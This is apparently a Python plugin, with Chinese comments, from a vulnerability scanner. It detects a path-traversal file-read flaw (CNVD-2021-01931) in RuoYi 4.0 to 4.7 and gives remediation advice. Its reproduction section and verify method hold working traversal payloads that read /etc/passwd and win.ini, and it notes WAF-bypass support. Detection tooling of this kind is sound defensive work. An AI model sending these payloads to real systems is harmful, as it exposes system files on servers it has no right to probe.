# 任意文件读取：通过 /common/download/resource 接口读取 /etc/passwd
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.matcher import match_file_read_leak
from lib.reachability import login_wall_reason
from lib.reporter import emit
from plugins.base import PluginBase


class FileReadPlugin(PluginBase):
    name = "任意文件读取"
    cve = "CNVD-2021-01931"
    severity = "high"
    category = "vuln"
    description = "通过 /common/download/resource 的 resource 参数目录穿越读取 /etc/passwd"
    fix = "限制 resource 参数路径，禁止 .. 目录穿越，下载接口强制鉴权"
    fix_detail = (
        "【升级方案】升级 RuoYi 至 4.7.0+（该版本已修复路径穿越）\n"
        "【代码修复】修改 CommonController.downloadResource()，对 resource 参数做路径校验：\n"
        '  String fileName = resource.substring(resource.lastIndexOf("/") + 1);\n'
        '  if (fileName.contains("..") || fileName.contains("\\")) { throw new ServiceException("非法路径"); }\n'
        "【配置加固】在 application.yml 中限制下载根目录：\n"
        "  ruoyi.profile: /data/upload （不要使用相对路径或用户可写目录）\n"
        "【权限加固】为 /common/download/resource 添加 @PreAuthorize 注解，要求登录后才可访问\n"
        '【WAF 规则】拦截 resource 参数含 ".." 或以 "/" 开头的请求\n'
        "【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制"
    )
    reproduce = (
        'curl "http://target/common/download/resource?resource=/profile/../../../../../../../etc/passwd"\n'
        "\n"
        "# Windows 系统可尝试读取 win.ini：\n"
        'curl "http://target/common/download/resource?resource=/profile/../../../../../../../windows/win.ini"\n'
        "\n"
        '# 预期响应：响应体含 "root:" 或 "[fonts]" 字样（Linux/Windows 系统文件特征）'
    )
    # D2：路径穿越在 4.7.0 已修复
    affected_versions = ">=4.0,<4.7"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A01:2021"
    # D7: WAF 绕过支持
    vuln_type = "file_read"
    supports_waf_bypass = True

    def verify(self, target, session):
        """通过 /common/download/resource 路径穿越读取 /etc/passwd 验证漏洞

        @param target: 目标主机，用于拼接下载接口地址
        @param session: 复用的 HTTP 会话对象
        @return: ScanResult——响应含真实 /etc/passwd 行特征（root:x:0:0: 等）为 CONFIRMED，否则 SAFE
        """
        # 原 URL 拼接：self.url + '/common/...'（self.url 以 / 结尾，保留双斜杠特性）
        url = join_url(target, "/common/download/resource?resource=/profile/../../../../../../../etc/passwd")
        try:
            resp = session.get(url)
            file_read_use = resp.text or ""
        except Exception as e:
            emit(no("任意文件读取（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
        # 登录墙（302 -> /login / 200 登录页）：没读到文件内容 ≠ 不存在
        _wall = login_wall_reason(resp)
        if _wall:
            emit(no("任意文件读取（登录墙拦截）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=url,
                evidence=f"请求被登录墙拦截（{_wall}），无法判定文件读取是否存在",
            )
        # 强特征判定：使用 lib.matcher.match_file_read_leak（校验 root:x:0:0:、daemon:x:1:1: 等真实 passwd 行特征）。
        # 加固说明：原判据 match_all(text, ["root", ":/"]) 过弱——":/" 在任意含 URL 的页面都出现，
        # "root" 更是 HTML/JS/报错页的常客，普通页面即可满足，造成确定性误报。
        if match_file_read_leak(file_read_use):
            emit(ok("存在任意文件读取漏洞"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含 /etc/passwd 真实行特征（如 root:x:0:0:）",
                fix=self.fix,
                # 结构化漏洞元数据：报告层按 vuln_type/payload_class 分类聚合统计
                extra={
                    "vuln_type": "arbitrary_file_read",
                    "payload_class": "traversal_etc_passwd",
                    "plugin_name": "file_read",
                },
            )
        else:
            emit(no("不存在任意文件读取漏洞"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                status=STATUS_SAFE,
                url=url,
                evidence="HTTP 200 但响应未含 /etc/passwd 真实行特征（root:x:0:0: 等）",
            )
